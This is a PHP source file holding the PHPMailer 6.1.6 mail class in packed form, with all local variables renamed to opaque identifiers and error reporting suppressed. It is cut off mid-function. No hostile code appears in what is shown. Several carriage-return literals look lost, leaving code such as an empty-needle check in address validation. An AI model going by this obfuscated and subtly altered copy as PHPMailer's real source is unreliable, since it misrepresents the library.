<?php
error_reporting(E_PARSE | E_CORE_ERROR); class PHPMailer { const CHARSET_ASCII = 'us-ascii'; const CHARSET_ISO88591 = 'iso-8859-1'; const CHARSET_UTF8 = 'utf-8'; const CONTENT_TYPE_PLAINTEXT = 'text/plain'; const CONTENT_TYPE_TEXT_CALENDAR = 'text/calendar'; const CONTENT_TYPE_TEXT_HTML = 'text/html'; const CONTENT_TYPE_MULTIPART_ALTERNATIVE = 'multipart/alternative'; const CONTENT_TYPE_MULTIPART_MIXED = 'multipart/mixed'; const CONTENT_TYPE_MULTIPART_RELATED = 'multipart/related'; const ENCODING_7BIT = '7bit'; const ENCODING_8BIT = '8bit'; const ENCODING_BASE64 = 'base64'; const ENCODING_BINARY = 'binary'; const ENCODING_QUOTED_PRINTABLE = 'quoted-printable'; const ENCRYPTION_STARTTLS = 'tls'; const ENCRYPTION_SMTPS = 'ssl'; const ICAL_METHOD_REQUEST = 'REQUEST'; const ICAL_METHOD_PUBLISH = 'PUBLISH'; const ICAL_METHOD_REPLY = 'REPLY'; const ICAL_METHOD_ADD = 'ADD'; const ICAL_METHOD_CANCEL = 'CANCEL'; const ICAL_METHOD_REFRESH = 'REFRESH'; const ICAL_METHOD_COUNTER = 'COUNTER'; const ICAL_METHOD_DECLINECOUNTER = 'DECLINECOUNTER'; public $Priority; public $CharSet = self::CHARSET_ISO88591; public $ContentType = self::CONTENT_TYPE_PLAINTEXT; public $Encoding = self::ENCODING_8BIT; public $ErrorInfo = ''; public $From = 'root@localhost'; public $FromName = 'Root User'; public $Sender = ''; public $Subject = ''; public $Body = ''; public $AltBody = ''; public $Ical = ''; protected static $IcalMethods = array(self::ICAL_METHOD_REQUEST, self::ICAL_METHOD_PUBLISH, self::ICAL_METHOD_REPLY, self::ICAL_METHOD_ADD, self::ICAL_METHOD_CANCEL, self::ICAL_METHOD_REFRESH, self::ICAL_METHOD_COUNTER, self::ICAL_METHOD_DECLINECOUNTER); protected $MIMEBody = ''; protected $MIMEHeader = ''; protected $mailHeader = ''; public $WordWrap = 0; public $Mailer = 'mail'; public $Sendmail = '/usr/sbin/sendmail'; public $UseSendmailOptions = true; public $ConfirmReadingTo = ''; public $Hostname = ''; public $MessageID = ''; public $MessageDate = ''; public $Host = 'localhost'; public $Port = 25; public $Helo = ''; public $SMTPSecure = ''; public $SMTPAutoTLS = true; public $SMTPAuth = false; public $SMTPOptions = array(); public $Username = ''; public $Password = ''; public $AuthType = ''; protected $oauth; public $Timeout = 300; public $dsn = ''; public $SMTPDebug = 0; public $Debugoutput = 'echo'; public $SMTPKeepAlive = false; public $SingleTo = false; protected $SingleToArray = array(); public $do_verp = false; public $AllowEmpty = false; public $DKIM_selector = ''; public $DKIM_identity = ''; public $DKIM_passphrase = ''; public $DKIM_domain = ''; public $DKIM_copyHeaderFields = true; public $DKIM_extraHeaders = array(); public $DKIM_private = ''; public $DKIM_private_string = ''; public $action_function = ''; public $XMailer = ''; public static $validator = 'php'; protected $smtp; protected $to = array(); protected $cc = array(); protected $bcc = array(); protected $ReplyTo = array(); protected $all_recipients = array(); protected $RecipientsQueue = array(); protected $ReplyToQueue = array(); protected $attachment = array(); protected $CustomHeader = array(); protected $lastMessageID = ''; protected $message_type = ''; protected $boundary = array(); protected $language = array(); protected $error_count = 0; protected $sign_cert_file = ''; protected $sign_key_file = ''; protected $sign_extracerts_file = ''; protected $sign_key_pass = ''; protected $exceptions = false; protected $uniqueid = ''; const VERSION = '6.1.6'; const STOP_MESSAGE = 0; const STOP_CONTINUE = 1; const STOP_CRITICAL = 2; const CRLF = '
'; const FWS = ' '; protected static $LE = self::CRLF; const MAIL_MAX_LINE_LENGTH = 63; const MAX_LINE_LENGTH = 998; const STD_LINE_LENGTH = 76; public function __construct($sp2ca21f = null) { if (null !== $sp2ca21f) { $this->exceptions = (bool) $sp2ca21f; } $this->Debugoutput = strpos(PHP_SAPI, 'cli') !== false ? 'echo' : 'html'; } public function __destruct() { $this->smtpClose(); } private function spcf7db0($sp56d48b, $sp037e30, $spa717d7, $sp6d38ac, $sp45ffb2) { if (ini_get('mbstring.func_overload') & 1) { $sp037e30 = $this->secureHeader($sp037e30); } else { $sp037e30 = $this->encodeHeader($this->secureHeader($sp037e30)); } if (!$this->UseSendmailOptions || null === $sp45ffb2) { $spf7a64c = @mail($sp56d48b, $sp037e30, $spa717d7, $sp6d38ac); } else { $spf7a64c = @mail($sp56d48b, $sp037e30, $spa717d7, $sp6d38ac, $sp45ffb2); } return $spf7a64c; } protected function edebug($sp9f0ad1) { if ($this->SMTPDebug <= 0) { return; } if ($this->Debugoutput instanceof \Psr\Log\LoggerInterface) { $this->Debugoutput->debug($sp9f0ad1); return; } if (is_callable($this->Debugoutput) && !in_array($this->Debugoutput, array('error_log', 'html', 'echo'))) { call_user_func($this->Debugoutput, $sp9f0ad1, $this->SMTPDebug); return; } switch ($this->Debugoutput) { case 'error_log': error_log($sp9f0ad1); break; case 'html': echo htmlentities(preg_replace('/[\\r\\n]+/', '', $sp9f0ad1), ENT_QUOTES, 'UTF-8'), '<br>
'; break; case 'echo': default: $sp9f0ad1 = preg_replace('/\\r\\n|\\r/m', '
', $sp9f0ad1); echo gmdate('Y-m-d H:i:s'), '	', trim(str_replace('
', '
                   	                  ', trim($sp9f0ad1))), '
'; } } public function isHTML($sp8c257e = true) { if ($sp8c257e) { $this->ContentType = static::CONTENT_TYPE_TEXT_HTML; } else { $this->ContentType = static::CONTENT_TYPE_PLAINTEXT; } } public function isSMTP() { $this->Mailer = 'smtp'; } public function isMail() { $this->Mailer = 'mail'; } public function isSendmail() { $sp46462e = ini_get('sendmail_path'); if (false === stripos($sp46462e, 'sendmail')) { $this->Sendmail = '/usr/sbin/sendmail'; } else { $this->Sendmail = $sp46462e; } $this->Mailer = 'sendmail'; } public function isQmail() { $sp46462e = ini_get('sendmail_path'); if (false === stripos($sp46462e, 'qmail')) { $this->Sendmail = '/var/qmail/bin/qmail-inject'; } else { $this->Sendmail = $sp46462e; } $this->Mailer = 'qmail'; } public function addAddress($spafcd4c, $spa6eece = '') { return $this->addOrEnqueueAnAddress('to', $spafcd4c, $spa6eece); } public function addCC($spafcd4c, $spa6eece = '') { return $this->addOrEnqueueAnAddress('cc', $spafcd4c, $spa6eece); } public function addBCC($spafcd4c, $spa6eece = '') { return $this->addOrEnqueueAnAddress('bcc', $spafcd4c, $spa6eece); } public function addReplyTo($spafcd4c, $spa6eece = '') { return $this->addOrEnqueueAnAddress('Reply-To', $spafcd4c, $spa6eece); } protected function addOrEnqueueAnAddress($spb3be72, $spafcd4c, $spa6eece) { $spafcd4c = trim($spafcd4c); $spa6eece = trim(preg_replace('/[\\r\\n]+/', '', $spa6eece)); $sp595d7d = strrpos($spafcd4c, '@'); if (false === $sp595d7d) { $spe9c055 = sprintf('%s (%s): %s', $this->lang('invalid_address'), $spb3be72, $spafcd4c); $this->setError($spe9c055); $this->edebug($spe9c055); if ($this->exceptions) { throw new Exception($spe9c055); } return false; } $sp45ffb2 = array($spb3be72, $spafcd4c, $spa6eece); if (static::idnSupported() && $this->has8bitChars(substr($spafcd4c, ++$sp595d7d))) { if ('Reply-To' !== $spb3be72) { if (!array_key_exists($spafcd4c, $this->RecipientsQueue)) { $this->RecipientsQueue[$spafcd4c] = $sp45ffb2; return true; } } elseif (!array_key_exists($spafcd4c, $this->ReplyToQueue)) { $this->ReplyToQueue[$spafcd4c] = $sp45ffb2; return true; } return false; } return call_user_func_array(array($this, 'addAnAddress'), $sp45ffb2); } protected function addAnAddress($spb3be72, $spafcd4c, $spa6eece = '') { if (!in_array($spb3be72, array('to', 'cc', 'bcc', 'Reply-To'))) { $spe9c055 = sprintf('%s: %s', $this->lang('Invalid recipient kind'), $spb3be72); $this->setError($spe9c055); $this->edebug($spe9c055); if ($this->exceptions) { throw new Exception($spe9c055); } return false; } if (!static::validateAddress($spafcd4c)) { $spe9c055 = sprintf('%s (%s): %s', $this->lang('invalid_address'), $spb3be72, $spafcd4c); $this->setError($spe9c055); $this->edebug($spe9c055); if ($this->exceptions) { throw new Exception($spe9c055); } return false; } if ('Reply-To' !== $spb3be72) { if (!array_key_exists(strtolower($spafcd4c), $this->all_recipients)) { $this->{$spb3be72}[] = array($spafcd4c, $spa6eece); $this->all_recipients[strtolower($spafcd4c)] = true; return true; } } elseif (!array_key_exists(strtolower($spafcd4c), $this->ReplyTo)) { $this->ReplyTo[strtolower($spafcd4c)] = array($spafcd4c, $spa6eece); return true; } return false; } public static function parseAddresses($sp088576, $sp66fb0f = true) { $spbf39d2 = array(); if ($sp66fb0f && function_exists('imap_rfc822_parse_adrlist')) { $spc9f0cb = imap_rfc822_parse_adrlist($sp088576, ''); foreach ($spc9f0cb as $spafcd4c) { if ('.SYNTAX-ERROR.' !== $spafcd4c->host && static::validateAddress($spafcd4c->mailbox . '@' . $spafcd4c->host)) { $spbf39d2[] = array('name' => property_exists($spafcd4c, 'personal') ? $spafcd4c->personal : '', 'address' => $spafcd4c->mailbox . '@' . $spafcd4c->host); } } } else { $spc9f0cb = explode(',', $sp088576); foreach ($spc9f0cb as $spafcd4c) { $spafcd4c = trim($spafcd4c); if (strpos($spafcd4c, '<') === false) { if (static::validateAddress($spafcd4c)) { $spbf39d2[] = array('name' => '', 'address' => $spafcd4c); } } else { list($spa6eece, $spf668b3) = explode('<', $spafcd4c); $spf668b3 = trim(str_replace('>', '', $spf668b3)); if (static::validateAddress($spf668b3)) { $spbf39d2[] = array('name' => trim(str_replace(array('"', '\''), '', $spa6eece)), 'address' => $spf668b3); } } } } return $spbf39d2; } public function setFrom($spafcd4c, $spa6eece = '', $spcf758c = true) { $spafcd4c = trim($spafcd4c); $spa6eece = trim(preg_replace('/[\\r\\n]+/', '', $spa6eece)); $sp595d7d = strrpos($spafcd4c, '@'); if (false === $sp595d7d || (!$this->has8bitChars(substr($spafcd4c, ++$sp595d7d)) || !static::idnSupported()) && !static::validateAddress($spafcd4c)) { $spe9c055 = sprintf('%s (From): %s', $this->lang('invalid_address'), $spafcd4c); $this->setError($spe9c055); $this->edebug($spe9c055); if ($this->exceptions) { throw new Exception($spe9c055); } return false; } $this->From = $spafcd4c; $this->FromName = $spa6eece; if ($spcf758c && empty($this->Sender)) { $this->Sender = $spafcd4c; } return true; } public function getLastMessageID() { return $this->lastMessageID; } public static function validateAddress($spafcd4c, $spf904bf = null) { if (null === $spf904bf) { $spf904bf = static::$validator; } if (is_callable($spf904bf)) { return $spf904bf($spafcd4c); } if (strpos($spafcd4c, '
') !== false || strpos($spafcd4c, '') !== false) { return false; } switch ($spf904bf) { case 'pcre': case 'pcre8': return (bool) preg_match('/^(?!(?>(?1)"?(?>\\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\\[ -~]|[^"])"?(?1)){65,}@)' . '((?>(?>(?>((?>(?>(?>\\x0D\\x0A)?[\\t ])+|(?>[\\t ]*\\x0D\\x0A)?[\\t ]+)?)(\\((?>(?2)' . '(?>[\\x01-\\x08\\x0B\\x0C\\x0E-\'*-\\[\\]-\\x7F]|\\\\[\\x00-\\x7F]|(?3)))*(?2)\\)))+(?2))|(?2))?)' . '([!#-\'*+\\/-9=?^-~-]+|"(?>(?2)(?>[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\[\\x00-\\x7F]))*' . '(?2)")(?>(?1)\\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' . '(?>(?1)\\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' . '|(?!(?:.*[a-f0-9][:\\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' . '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' . '|[1-9]?[0-9])(?>\\.(?9)){3}))\\])(?1)$/isD', $spafcd4c); case 'html5': return (bool) preg_match('/^[a-zA-Z0-9.!#$%&\'*+\\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' . '[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD', $spafcd4c); case 'php': default: return filter_var($spafcd4c, FILTER_VALIDATE_EMAIL) !== false; } } public static function idnSupported() { return function_exists('idn_to_ascii') && function_exists('mb_convert_encoding'); } public function punyencodeAddress($spafcd4c) { $sp595d7d = strrpos($spafcd4c, '@'); if (!empty($this->CharSet) && false !== $sp595d7d && static::idnSupported()) { $sp9e80f2 = substr($spafcd4c, ++$sp595d7d); if ($this->has8bitChars($sp9e80f2) && @mb_check_encoding($sp9e80f2, $this->CharSet)) { $sp9e80f2 = mb_convert_encoding($sp9e80f2, 'UTF-8', $this->CharSet); $sp75809c = 0; if (defined('INTL_IDNA_VARIANT_UTS46')) { $sp5d31bb = idn_to_ascii($sp9e80f2, $sp75809c, INTL_IDNA_VARIANT_UTS46); } elseif (defined('INTL_IDNA_VARIANT_2003')) { $sp5d31bb = idn_to_ascii($sp9e80f2, $sp75809c, INTL_IDNA_VARIANT_2003); } else { $sp5d31bb = idn_to_ascii($sp9e80f2, $sp75809c); } if (false !== $sp5d31bb) { return substr($spafcd4c, 0, $sp595d7d) . $sp5d31bb; } } } return $spafcd4c; } public function send() { try { if (!$this->preSend()) { return false; } return $this->postSend(); } catch (Exception $spa8a109) { $this->mailHeader = ''; $this->setError($spa8a109->getMessage()); if ($this->exceptions) { throw $spa8a109; } return false; } } public function preSend() { if ('smtp' === $this->Mailer || 'mail' === $this->Mailer && stripos(PHP_OS, 'WIN') === 0) { static::setLE(self::CRLF); } else { static::setLE(PHP_EOL); } if ('mail' === $this->Mailer && (PHP_VERSION_ID >= 70000 && PHP_VERSION_ID < 70017 || PHP_VERSION_ID >= 70100 && PHP_VERSION_ID < 70103) && ini_get('mail.add_x_header') === '1' && stripos(PHP_OS, 'WIN') === 0) { trigger_error('Your version of PHP is affected by a bug that may result in corrupted messages.' . ' To fix it, switch to sending using SMTP, disable the mail.add_x_header option in' . ' your php.ini, switch to MacOS or Linux, or upgrade your PHP to version 7.0.17+ or 7.1.3+.', E_USER_WARNING); } try { $this->error_count = 0; $this->mailHeader = ''; foreach (array_merge($this->RecipientsQueue, $this->ReplyToQueue) as $sp45ffb2) { $sp45ffb2[1] = $this->punyencodeAddress($sp45ffb2[1]); call_user_func_array(array($this, 'addAnAddress'), $sp45ffb2); } if (count($this->to) + count($this->cc) + count($this->bcc) < 1) { throw new Exception($this->lang('provide_address'), self::STOP_CRITICAL); } foreach (array('From', 'Sender', 'ConfirmReadingTo') as $sp76ca01) { $this->{$sp76ca01} = trim($this->{$sp76ca01}); if (empty($this->{$sp76ca01})) { continue; } $this->{$sp76ca01} = $this->punyencodeAddress($this->{$sp76ca01}); if (!static::validateAddress($this->{$sp76ca01})) { $spe9c055 = sprintf('%s (%s): %s', $this->lang('invalid_address'), $sp76ca01, $this->{$sp76ca01}); $this->setError($spe9c055); $this->edebug($spe9c055); if ($this->exceptions) { throw new Exception($spe9c055); } return false; } } if ($this->alternativeExists()) { $this->ContentType = static::CONTENT_TYPE_MULTIPART_ALTERNATIVE; } $this->setMessageType(); if (!$this->AllowEmpty && empty($this->Body)) { throw new Exception($this->lang('empty_message'), self::STOP_CRITICAL); } $this->Subject = trim($this->Subject); $this->MIMEHeader = ''; $this->MIMEBody = $this->createBody(); $sp09b0f0 = $this->MIMEHeader; $this->MIMEHeader = $this->createHeader(); $this->MIMEHeader .= $sp09b0f0; if ('mail' === $this->Mailer) { if (count($this->to) > 0) { $this->mailHeader .= $this->addrAppend('To', $this->to); } else { $this->mailHeader .= $this->headerLine('To', 'undisclosed-recipients:;'); } $this->mailHeader .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject))); } if (!empty($this->DKIM_domain) && !empty($this->DKIM_selector) && (!empty($this->DKIM_private_string) || !empty($this->DKIM_private) && static::isPermittedPath($this->DKIM_private) && file_exists($this->DKIM_private))) { $spfcfa33 = $this->DKIM_Add($this->MIMEHeader . $this->mailHeader, $this->encodeHeader($this->secureHeader($this->Subject)), $this->MIMEBody); $this->MIMEHeader = static::stripTrailingWSP($this->MIMEHeader) . static::$LE . static::normalizeBreaks($spfcfa33) . static::$LE; } return true; } catch (Exception $spa8a109) { $this->setError($spa8a109->getMessage()); if ($this->exceptions) { throw $spa8a109; } return false; } } public function postSend() { try { switch ($this->Mailer) { case 'sendmail': case 'qmail': return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody); case 'smtp': return $this->smtpSend($this->MIMEHeader, $this->MIMEBody); case 'mail': return $this->mailSend($this->MIMEHeader, $this->MIMEBody); default: $sp1e6ba7 = $this->Mailer . 'Send'; if (method_exists($this, $sp1e6ba7)) { return $this->{$sp1e6ba7}($this->MIMEHeader, $this->MIMEBody); } return $this->mailSend($this->MIMEHeader, $this->MIMEBody); } } catch (Exception $spa8a109) { $this->setError($spa8a109->getMessage()); $this->edebug($spa8a109->getMessage()); if ($this->exceptions) { throw $spa8a109; } } return false; } protected function sendmailSend($sp6d38ac, $spa717d7) { $sp6d38ac = static::stripTrailingWSP($sp6d38ac) . static::$LE . static::$LE; if (!empty($this->Sender) && self::isShellSafe($this->Sender)) { if ('qmail' === $this->Mailer) { $spe0421f = '%s -f%s'; } else { $spe0421f = '%s -oi -f%s -t'; } } elseif ('qmail' === $this->Mailer) { $spe0421f = '%s'; } else { $spe0421f = '%s -oi -t'; } $sp06aedd = sprintf($spe0421f, escapeshellcmd($this->Sendmail), $this->Sender); if ($this->SingleTo) { foreach ($this->SingleToArray as $sp06a53f) { $sp28a536 = @popen($sp06aedd, 'w'); if (!$sp28a536) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } fwrite($sp28a536, 'To: ' . $sp06a53f . '
'); fwrite($sp28a536, $sp6d38ac); fwrite($sp28a536, $spa717d7); $spf7a64c = pclose($sp28a536); $this->doCallback($spf7a64c === 0, array($sp06a53f), $this->cc, $this->bcc, $this->Subject, $spa717d7, $this->From, array()); if (0 !== $spf7a64c) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } } } else { $sp28a536 = @popen($sp06aedd, 'w'); if (!$sp28a536) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } fwrite($sp28a536, $sp6d38ac); fwrite($sp28a536, $spa717d7); $spf7a64c = pclose($sp28a536); $this->doCallback($spf7a64c === 0, $this->to, $this->cc, $this->bcc, $this->Subject, $spa717d7, $this->From, array()); if (0 !== $spf7a64c) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } } return true; } protected static function isShellSafe($sp9312ed) { if (escapeshellcmd($sp9312ed) !== $sp9312ed || !in_array(escapeshellarg($sp9312ed), array("'{$sp9312ed}'", "\"{$sp9312ed}\""))) { return false; } $sp58643f = strlen($sp9312ed); for ($sp16364a = 0; $sp16364a < $sp58643f; ++$sp16364a) { $sp723dd4 = $sp9312ed[$sp16364a]; if (!ctype_alnum($sp723dd4) && strpos('@_-.', $sp723dd4) === false) { return false; } } return true; } protected static function isPermittedPath($sp3db27e) { return !preg_match('#^[a-z]+://#i', $sp3db27e); } protected function mailSend($sp6d38ac, $spa717d7) { $sp6d38ac = static::stripTrailingWSP($sp6d38ac) . static::$LE . static::$LE; $spdcdaf5 = array(); foreach ($this->to as $sp33348c) { $spdcdaf5[] = $this->addrFormat($sp33348c); } $sp56d48b = implode(', ', $spdcdaf5); $sp45ffb2 = null; if (!empty($this->Sender) && static::validateAddress($this->Sender) && self::isShellSafe($this->Sender)) { $sp45ffb2 = sprintf('-f%s', $this->Sender); } if (!empty($this->Sender) && static::validateAddress($this->Sender)) { $sp3d0d1c = ini_get('sendmail_from'); ini_set('sendmail_from', $this->Sender); } $spf7a64c = false; if ($this->SingleTo && count($spdcdaf5) > 1) { foreach ($spdcdaf5 as $sp06a53f) { $spf7a64c = $this->spcf7db0($sp06a53f, $this->Subject, $spa717d7, $sp6d38ac, $sp45ffb2); $this->doCallback($spf7a64c, array($sp06a53f), $this->cc, $this->bcc, $this->Subject, $spa717d7, $this->From, array()); } } else { $spf7a64c = $this->spcf7db0($sp56d48b, $this->Subject, $spa717d7, $sp6d38ac, $sp45ffb2); $this->doCallback($spf7a64c, $this->to, $this->cc, $this->bcc, $this->Subject, $spa717d7, $this->From, array()); } if (isset($sp3d0d1c)) { ini_set('sendmail_from', $sp3d0d1c); } if (!$spf7a64c) { throw new Exception($this->lang('instantiate'), self::STOP_CRITICAL); } return true; } public function getSMTPInstance() { if (!is_object($this->smtp)) { $this->smtp = new SMTP(); } return $this->smtp; } public function setSMTPInstance(SMTP $sp54770f) { $this->smtp = $sp54770f; return $this->smtp; } protected function smtpSend($sp6d38ac, $spa717d7) { $sp6d38ac = static::stripTrailingWSP($sp6d38ac) . static::$LE . static::$LE; $sp9a36de = array(); if (!$this->smtpConnect($this->SMTPOptions)) { throw new Exception($this->lang('smtp_connect_failed'), self::STOP_CRITICAL); } if ('' === $this->Sender) { $spf7e69c = $this->From; } else { $spf7e69c = $this->Sender; } if (!$this->smtp->mail($spf7e69c)) { $this->setError($this->lang('from_failed') . $spf7e69c . ' : ' . implode(',', $this->smtp->getError())); throw new Exception($this->ErrorInfo, self::STOP_CRITICAL); } $sp6d8016 = array(); foreach (array($this->to, $this->cc, $this->bcc) as $sp4a3586) { foreach ($sp4a3586 as $sp56d48b) { if (!$this->smtp->recipient($sp56d48b[0], $this->dsn)) { $spbd34bb = $this->smtp->getError(); $sp9a36de[] = array('to' => $sp56d48b[0], 'error' => $spbd34bb['detail']); $spfe6797 = false; } else { $spfe6797 = true; } $sp6d8016[] = array('issent' => $spfe6797, 'to' => $sp56d48b[0]); } } if (count($this->all_recipients) > count($sp9a36de) && !$this->smtp->data($sp6d38ac . $spa717d7)) { throw new Exception($this->lang('data_not_accepted'), self::STOP_CRITICAL); } $sp82e4aa = $this->smtp->getLastTransactionID(); if ($this->SMTPKeepAlive) { $this->smtp->reset(); } else { $this->smtp->quit(); $this->smtp->close(); } foreach ($sp6d8016 as $sp841a23) { $this->doCallback($sp841a23['issent'], array($sp841a23['to']), array(), array(), $this->Subject, $spa717d7, $this->From, array('smtp_transaction_id' => $sp82e4aa)); } if (count($sp9a36de) > 0) { $spced0f7 = ''; foreach ($sp9a36de as $sp52b2d9) { $spced0f7 .= $sp52b2d9['to'] . ': ' . $sp52b2d9['error']; } throw new Exception($this->lang('recipients_failed') . $spced0f7, self::STOP_CONTINUE); } return true; } public function smtpConnect($spc01b26 = null) { if (null === $this->smtp) { $this->smtp = $this->getSMTPInstance(); } if (null === $spc01b26) { $spc01b26 = $this->SMTPOptions; } if ($this->smtp->connected()) { return true; } $this->smtp->setTimeout($this->Timeout); $this->smtp->setDebugLevel($this->SMTPDebug); $this->smtp->setDebugOutput($this->Debugoutput); $this->smtp->setVerp($this->do_verp); $sp95bfef = explode(';', $this->Host); $spa96672 = null; foreach ($sp95bfef as $sp8f914b) { $sp6aceae = array(); if (!preg_match('/^(?:(ssl|tls):\\/\\/)?(.+?)(?::(\\d+))?$/', trim($sp8f914b), $sp6aceae)) { $this->edebug($this->lang('invalid_hostentry') . ' ' . trim($sp8f914b)); continue; } if (!static::isValidHost($sp6aceae[2])) { $this->edebug($this->lang('invalid_host') . ' ' . $sp6aceae[2]); continue; } $sp950eaf = ''; $sp25c529 = $this->SMTPSecure; $spb4a558 = static::ENCRYPTION_STARTTLS === $this->SMTPSecure; if ('ssl' === $sp6aceae[1] || '' === $sp6aceae[1] && static::ENCRYPTION_SMTPS === $this->SMTPSecure) { $sp950eaf = 'ssl://'; $spb4a558 = false; $sp25c529 = static::ENCRYPTION_SMTPS; } elseif ('tls' === $sp6aceae[1]) { $spb4a558 = true; $sp25c529 = static::ENCRYPTION_STARTTLS; } $spe74d44 = defined('OPENSSL_ALGO_SHA256'); if (static::ENCRYPTION_STARTTLS === $sp25c529 || static::ENCRYPTION_SMTPS === $sp25c529) { if (!$spe74d44) { throw new Exception($this->lang('extension_missing') . 'openssl', self::STOP_CRITICAL); } } $sp36d8cf = $sp6aceae[2]; $spdc41f4 = $this->Port; if (array_key_exists(3, $sp6aceae) && is_numeric($sp6aceae[3]) && $sp6aceae[3] > 0 && $sp6aceae[3] < 65536) { $spdc41f4 = (int) $sp6aceae[3]; } if ($this->smtp->connect($sp950eaf . $sp36d8cf, $spdc41f4, $this->Timeout, $spc01b26)) { try { if ($this->Helo) { $speddc2c = $this->Helo; } else { $speddc2c = $this->serverHostname(); } $this->smtp->hello($speddc2c); if ($this->SMTPAutoTLS && $spe74d44 && 'ssl' !== $sp25c529 && $this->smtp->getServerExt('STARTTLS')) { $spb4a558 = true; } if ($spb4a558) { if (!$this->smtp->startTLS()) { throw new Exception($this->lang('connect_host')); } $this->smtp->hello($speddc2c); } if ($this->SMTPAuth && !$this->smtp->authenticate($this->Username, $this->Password, $this->AuthType, $this->oauth)) { throw new Exception($this->lang('authenticate')); } return true; } catch (Exception $spa8a109) { $spa96672 = $spa8a109; $this->edebug($spa8a109->getMessage()); $this->smtp->quit(); } } } $this->smtp->close(); if ($this->exceptions && null !== $spa96672) { throw $spa96672; } return false; } public function smtpClose() { if (null !== $this->smtp && $this->smtp->connected()) { $this->smtp->quit(); $this->smtp->close(); } } public function setLanguage($spdbafdc = 'en', $spd22e08 = '') { $spdead4f = array('br' => 'pt_br', 'cz' => 'cs', 'dk' => 'da', 'no' => 'nb', 'se' => 'sv', 'rs' => 'sr', 'tg' => 'tl', 'am' => 'hy'); if (isset($spdead4f[$spdbafdc])) { $spdbafdc = $spdead4f[$spdbafdc]; } $spaf6184 = array('authenticate' => 'SMTP Error: Could not authenticate.', 'connect_host' => 'SMTP Error: Could not connect to SMTP host.', 'data_not_accepted' => 'SMTP Error: data not accepted.', 'empty_message' => 'Message body empty', 'encoding' => 'Unknown encoding: ', 'execute' => 'Could not execute: ', 'file_access' => 'Could not access file: ', 'file_open' => 'File Error: Could not open file: ', 'from_failed' => 'The following From address failed: ', 'instantiate' => 'Could not instantiate mail function.', 'invalid_address' => 'Invalid address: ', 'invalid_hostentry' => 'Invalid hostentry: ', 'invalid_host' => 'Invalid host: ', 'mailer_not_supported' => ' mailer is not supported.', 'provide_address' => 'You must provide at least one recipient email address.', 'recipients_failed' => 'SMTP Error: The following recipients failed: ', 'signing' => 'Signing Error: ', 'smtp_connect_failed' => 'SMTP connect() failed.', 'smtp_error' => 'SMTP server error: ', 'variable_set' => 'Cannot set or reset variable: ', 'extension_missing' => 'Extension missing: '); if (empty($spd22e08)) { $spd22e08 = dirname(__DIR__) . DIRECTORY_SEPARATOR . 'language' . DIRECTORY_SEPARATOR; } if (!preg_match('/^[a-z]{2}(?:_[a-zA-Z]{2})?$/', $spdbafdc)) { $spdbafdc = 'en'; } $sp52fb25 = true; $sp5afddc = $spd22e08 . 'phpmailer.lang-' . $spdbafdc . '.php'; if ('en' !== $spdbafdc) { if (!static::isPermittedPath($sp5afddc) || !file_exists($sp5afddc)) { $sp52fb25 = false; } else { $sp52fb25 = (include $sp5afddc); } } $this->language = $spaf6184; return (bool) $sp52fb25; } public function getTranslations() { return $this->language; } public function addrAppend($spcee89e, $sp798641) { $spbf39d2 = array(); foreach ($sp798641 as $spafcd4c) { $spbf39d2[] = $this->addrFormat($spafcd4c); } return $spcee89e . ': ' . implode(', ', $spbf39d2) . static::$LE; } public function addrFormat($sp798641) { if (empty($sp798641[1])) { return $this->secureHeader($sp798641[0]); } return $this->encodeHeader($this->secureHeader($sp798641[1]), 'phrase') . ' <' . $this->secureHeader($sp798641[0]) . '>'; } public function wrapText($sp6df182, $sp58643f, $sp1867b2 = false) { if ($sp1867b2) { $sp7bdf4e = sprintf(' =%s', static::$LE); } else { $sp7bdf4e = static::$LE; } $sp9969d4 = static::CHARSET_UTF8 === strtolower($this->CharSet); $sp2107be = strlen(static::$LE); $spafae53 = strlen(static::$LE); $sp6df182 = static::normalizeBreaks($sp6df182); if (substr($sp6df182, -$sp2107be) === static::$LE) { $sp6df182 = substr($sp6df182, 0, -$sp2107be); } $spe35f43 = explode(static::$LE, $sp6df182); $sp6df182 = ''; foreach ($spe35f43 as $spb7cef0) { $sp68af59 = explode(' ', $spb7cef0); $sp2ff79a = ''; $sp1e2908 = true; foreach ($sp68af59 as $spc50cef) { if ($sp1867b2 && strlen($spc50cef) > $sp58643f) { $sp95e1e0 = $sp58643f - strlen($sp2ff79a) - $spafae53; if (!$sp1e2908) { if ($sp95e1e0 > 20) { $sp9f5735 = $sp95e1e0; if ($sp9969d4) { $sp9f5735 = $this->utf8CharBoundary($spc50cef, $sp9f5735); } elseif ('=' === substr($spc50cef, $sp9f5735 - 1, 1)) { --$sp9f5735; } elseif ('=' === substr($spc50cef, $sp9f5735 - 2, 1)) { $sp9f5735 -= 2; } $sp9d6ae3 = substr($spc50cef, 0, $sp9f5735); $spc50cef = substr($spc50cef, $sp9f5735); $sp2ff79a .= ' ' . $sp9d6ae3; $sp6df182 .= $sp2ff79a . sprintf('=%s', static::$LE); } else { $sp6df182 .= $sp2ff79a . $sp7bdf4e; } $sp2ff79a = ''; } while ($spc50cef !== '') { if ($sp58643f <= 0) { break; } $sp9f5735 = $sp58643f; if ($sp9969d4) { $sp9f5735 = $this->utf8CharBoundary($spc50cef, $sp9f5735); } elseif ('=' === substr($spc50cef, $sp9f5735 - 1, 